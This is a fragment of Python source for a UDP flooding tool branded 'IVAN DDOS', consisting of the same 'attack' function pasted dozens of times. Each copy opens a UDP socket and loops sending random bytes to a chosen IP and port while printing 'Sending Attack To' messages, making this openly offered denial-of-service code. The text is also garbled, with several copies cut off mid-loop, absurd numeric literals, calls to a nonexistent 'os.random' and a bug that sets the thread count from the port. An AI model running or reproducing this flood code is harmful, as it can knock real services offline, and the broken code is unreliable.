        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
